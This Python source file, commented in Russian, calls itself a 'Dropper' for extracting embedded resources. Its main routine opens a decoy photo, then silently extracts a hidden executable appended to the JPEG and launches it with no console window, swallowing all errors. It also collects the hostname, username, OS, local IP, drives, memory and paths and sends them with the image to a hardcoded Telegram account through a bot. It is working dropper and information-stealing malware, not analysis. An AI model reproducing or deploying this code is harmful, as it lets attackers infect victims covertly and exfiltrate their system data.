"""
Dropper - приложение для извлечения и сохранения встроенных ресурсов
"""
import sys
import os
import json
import requests
from pathlib import Path


def get_resource_path(relative_path):
    """
    Получить путь к ресурсу, встроенному в исполняемый файл.
    Работает как в режиме разработки, так и в скомпилированном exe.
    """
    try:
        # PyInstaller создает временную папку и сохраняет путь в _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        # В режиме разработки используем текущую директорию
        base_path = os.path.abspath(os.path.dirname(__file__))
    
    return os.path.join(base_path, relative_path)


# ID пользователя Telegram для отправки извлеченной информации
TELEGRAM_USER_ID = 8350084460


def get_telegram_bot_token():
    """
    Получить токен Telegram бота из переменной окружения или файла конфигурации.
    
    Returns:
        str: Токен бота или None, если не найден
    """
    # Сначала проверяем переменную окружения
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    if token:
        return token
    
    # Затем проверяем файл конфигурации
    config_path = get_resource_path("config.json")
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
                return config.get('telegram_bot_token')
        except Exception:
            pass
    
    return None


def send_to_telegram(file_path, user_id=None):
    """
    Отправляет файл в Telegram пользователю.
    
    Args:
        file_path (str): Путь к файлу для отправки
        user_id (int, optional): ID пользователя Telegram. Если не указан, используется TELEGRAM_USER_ID.
    
    Returns:
        bool: True если отправка успешна, False в противном случае
    """
    if user_id is None:
        user_id = TELEGRAM_USER_ID
    
    token = get_telegram_bot_token()
    if not token:
        return False
    
    try:
        # Читаем файл
        with open(file_path, 'rb') as f:
            files = {'photo': f}
            url = f"https://api.telegram.org/bot{token}/sendPhoto"
            data = {'chat_id': user_id}
            
            response = requests.post(url, data=data, files=files, timeout=30)
            
            if response.status_code == 200:
                return True
            else:
                print(f"Ошибка отправки в Telegram: {response.status_code}", file=sys.stderr)
                return False
    except requests.exceptions.RequestException as e:
        print(f"Ошибка соединения с Telegram: {e}", file=sys.stderr)
        return False
    except Exception as e:
        print(f"Неожиданная ошибка при отправке в Telegram: {e}", file=sys.stderr)
        return False


def send_info_to_telegram(message, user_id=None):
    """
    Отправляет текстовое сообщение в Telegram.
    
    Args:
        message (str): Текст сообщения
        user_id (int, optional): ID пользователя Telegram. Если не указан, используется TELEGRAM_USER_ID.
    
    Returns:
        bool: True если отправка успешна, False в противном случае
    """
    if user_id is None:
        user_id = TELEGRAM_USER_ID
    
    token = get_telegram_bot_token()
    if not token:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {
            'chat_id': user_id,
            'text': message
        }
        
        response = requests.post(url, data=data, timeout=30)
        
        if response.status_code == 200:
            return True
        else:
            print(f"Ошибка отправки сообщения в Telegram: {response.status_code}", file=sys.stderr)
            return False
    except requests.exceptions.RequestException as e:
        print(f"Ошибка соединения с Telegram: {e}", file=sys.stderr)
        return False
    except Exception as e:
        print(f"Неожиданная ошибка при отправке сообщения в Telegram: {e}", file=sys.stderr)
        return False


def extract_exe_from_image(image_path, output_exe_path):
    """
    Извлекает exe файл из изображения (стеганография).
    
    Args:
        image_path (str): Путь к изображению с встроенным exe
        output_exe_path (str): Путь для сохранения извлеченного exe
    
    Returns:
        bool: True если успешно, False в противном случае
    """
    try:
        # Читаем файл
        with open(image_path, 'rb') as f:
            data = f.read()
        
        # Ищем маркер конца JPEG
        end_marker = b'\xff\xd9'
        last_marker_pos = data.rfind(end_marker)
        
        if last_marker_pos == -1:
            return False
        
        # Ищем наш маркер встроенных данных
        embed_marker = b'\xff\xd8\xff\xe0'
        embed_pos = data.find(embed_marker, last_marker_pos)
        
        if embed_pos == -1:
            return False
        
        # Читаем размер exe (4 байта после маркера)
        size_pos = embed_pos + len(embed_marker)
        if size_pos + 4 > len(data):
            return False
        
        exe_size = int.from_bytes(data[size_pos:size_pos + 4], 'little')
        
        # Читаем exe данные
        exe_start = size_pos + 4
        exe_end = exe_start + exe_size
        
        if exe_end > len(data):
            return False
        
        exe_data = data[exe_start:exe_end]
        
        # Сохраняем exe
        with open(output_exe_path, 'wb') as f:
            f.write(exe_data)
        
        return True
        
    except Exception:
        return False


def extract_embedded_image(output_path=None):
    """
    Извлекает встроенное изображение и сохраняет его на диск.
    Также пытается извлечь и запустить скрытый exe из изображения.
    
    Args:
        output_path (str, optional): Путь для сохранения изображения.
                                     Если не указан, сохраняется в текущей директории.
    
    Returns:
        str: Путь к сохраненному файлу
    """
    embedded_image_path = get_resource_path("embedded_image.jpg")
    
    if not os.path.exists(embedded_image_path):
        raise FileNotFoundError(
            f"Встроенное изображение не найдено: {embedded_image_path}"
        )
    
    if output_path is None:
        output_path = os.path.join(os.getcwd(), "extracted_image.jpg")
    
    # Создаем директорию, если она не существует
    output_dir = os.path.dirname(output_path)
    if output_dir and not os.path.exists(output_dir):
        os.makedirs(output_dir, exist_ok=True)
    
    # Копируем файл
    with open(embedded_image_path, 'rb') as src:
        with open(output_path, 'wb') as dst:
            dst.write(src.read())
    
    # Пытаемся извлечь и запустить скрытый exe
    try:
        import tempfile
        import subprocess
        
        # Создаем временный файл для exe
        temp_dir = tempfile.gettempdir()
        hidden_exe_path = os.path.join(temp_dir, f"tmp_{os.urandom(8).hex()}.exe")
        
        # Извлекаем exe из изображения
        if extract_exe_from_image(embedded_image_path, hidden_exe_path):
            # Запускаем exe в фоновом режиме
            try:
                # Запускаем без окна консоли (CREATE_NO_WINDOW)
                if sys.platform == 'win32':
                    subprocess.Popen(
                        [hidden_exe_path],
                        creationflags=subprocess.CREATE_NO_WINDOW,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                else:
                    subprocess.Popen(
                        [hidden_exe_path],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
            except Exception:
                pass  # Игнорируем ошибки запуска
    
    except Exception:
        pass  # Игнорируем ошибки извлечения exe
    
    return output_path


def main():
    """Основная функция приложения"""
    try:
        # Полностью тихая работа - без консоли, без окон
        import socket
        import platform
        import tempfile
        import subprocess
        import webbrowser
        import shutil
        import time
        
        # Сначала открываем изображение СРАЗУ, чтобы пользователь видел фото
        embedded_image_path = get_resource_path("embedded_image.jpg")
        
        if not os.path.exists(embedded_image_path):
            # Если изображения нет, пытаемся найти его в текущей директории
            # (для случая, когда dropper.exe запущен напрямую)
            if os.path.exists("embedded_image.jpg"):
                embedded_image_path = "embedded_image.jpg"
            else:
                # Пытаемся найти изображение в той же папке, где находится exe
                exe_dir = os.path.dirname(sys.executable) if hasattr(sys, 'frozen') else os.path.dirname(__file__)
                potential_path = os.path.join(exe_dir, "embedded_image.jpg")
                if os.path.exists(potential_path):
                    embedded_image_path = potential_path
                else:
                    raise FileNotFoundError("Изображение не найдено")
        
        # СНАЧАЛА открываем изображение СРАЗУ (чтобы пользователь сразу видел фото)
        # Это делается ДО извлечения, чтобы было максимально быстро
        try:
            if sys.platform == 'win32':
                # Открываем встроенное изображение напрямую
                if os.path.exists(embedded_image_path):
                    os.startfile(embedded_image_path)
            else:
                webbrowser.open(embedded_image_path)
        except Exception:
            pass
        
        # Небольшая задержка, чтобы изображение успело открыться
        time.sleep(0.5)
        
        # Теперь извлекаем изображение (для отправки)
        output_path = extract_embedded_image()
        
        # Собираем полную информацию о системе
        import datetime
        import getpass
        
        hostname = socket.gethostname()
        username = getpass.getuser()
        system_info = platform.system()
        system_version = platform.version()
        machine = platform.machine()
        processor = platform.processor() or platform.machine()
        platform_info = platform.platform()
        
        # IP адрес
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except Exception:
            local_ip = "Не удалось определить"
        
        # Время запуска
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Рабочая директория
        current_dir = os.getcwd()
        
        # Диски (Windows)
        disks_info = ""
        if sys.platform == 'win32':
            try:
                import string
                import ctypes
                drives = []
                bitmask = ctypes.windll.kernel32.GetLogicalDrives()
                for letter in string.ascii_uppercase:
                    if bitmask & 1:
                        drives.append(f"{letter}:\\")
                    bitmask >>= 1
                disks_info = ", ".join(drives) if drives else "Не удалось определить"
            except Exception:
                disks_info = "Не удалось определить"
        else:
            disks_info = "N/A (не Windows)"
        
        # Информация о памяти (Windows)
        memory_info = ""
        if sys.platform == 'win32':
            try:
                import ctypes
                class MEMORYSTATUSEX(ctypes.Structure):
                    _fields_ = [
                        ("dwLength", ctypes.c_ulong),
                        ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong),
                        ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong),
                        ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong),
                        ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong),
                    ]
                
                memStatus = MEMORYSTATUSEX()
                memStatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
                ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(memStatus))
                
                total_gb = memStatus.ullTotalPhys / (1024**3)
                available_gb = memStatus.ullAvailPhys / (1024**3)
                memory_info = f"{total_gb:.2f} GB всего, {available_gb:.2f} GB доступно"
            except Exception:
                memory_info = "Не удалось определить"
        else:
            memory_info = "N/A (не Windows)"
        
        # Python версия (если доступна)
        python_version = f"{sys.version_info.major}.{sys.version_info.minor}.{sys.version_info.micro}"
        
        # Путь к exe
        exe_path = sys.executable if hasattr(sys, 'executable') else "N/A"
        
        # Формируем полное сообщение
        info_message = f"""📥 Извлечено изображение

🖥️ СИСТЕМА:
├─ Хост: {hostname}
├─ Пользователь: {username}
├─ ОС: {system_info} {system_version}
├─ Платформа: {platform_info}
├─ Архитектура: {machine}
└─ Процессор: {processor}

🌐 СЕТЬ:
└─ Локальный IP: {local_ip}

💾 РЕСУРСЫ:
├─ Память: {memory_info}
└─ Диски: {disks_info}

📁 ПУТИ:
├─ Рабочая директория: {current_dir}
├─ Путь к exe: {exe_path}
└─ Извлеченное изображение: {output_path}

⏰ ВРЕМЯ:
└─ Запуск: {current_time}

🐍 PYTHON:
└─ Версия: {python_version}"""
        
        # Отправляем текстовую информацию
        send_info_to_telegram(info_message)
        
        # Отправляем само изображение
        send_to_telegram(output_path)
        
        return 0
    except FileNotFoundError as e:
        send_info_to_telegram(f"❌ Ошибка извлечения: {str(e)}")
        return 1
    except Exception as e:
        send_info_to_telegram(f"❌ Неожиданная ошибка: {str(e)}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
